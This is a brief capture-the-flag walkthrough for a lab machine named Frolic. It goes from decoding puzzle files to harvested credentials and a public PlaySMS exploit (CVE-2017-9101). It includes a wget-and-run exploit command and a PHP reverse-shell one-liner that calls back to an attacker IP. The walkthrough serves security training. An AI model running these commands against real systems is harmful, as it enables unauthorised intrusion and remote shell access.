# Frolic

IP: `10.10.10.111`

## Findings

- port 9999
  - `/backup/password.txt` login password of `imnothuman`
  - `/admin` login password of `superduperlooperpassword_lol`
  - logging in grants a ook language page, decoding gives a path: `/asdiSIAJJ0QWE9JAS`
  - The contents of that path look like base64 encoded
  - We extract that into a text file and remove spaces
  - Now use `base64 -d  hash` to decode it and redirect output to a file
  - When running `file` on the newly decoded file, it appears as a zip
  - Unzipping the file with password `password` reveals another base64 like file in hex
  - Convert hex to base64 with `xxd`
  - Code is brain**** and decoding gives `idkwhatispass`
  - For the `/playsms` directory, the username `admin`/`idkwhatispass` works

```sh
wget https://github.com/jasperla/CVE-2017-9101/raw/master/playsmshell.py

python3 playsmshell.py --username admin --password idkwhatispass --url http://10.10.10.111:9999/playsms --interactive
```

Get a better shell back with:

```sh
php -r '$sock=fsockopen("10.10.14.21",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Priv esc

`/var/www/html/playsms/plugin/themes/ubuntu/config.php` writable, used by playsms
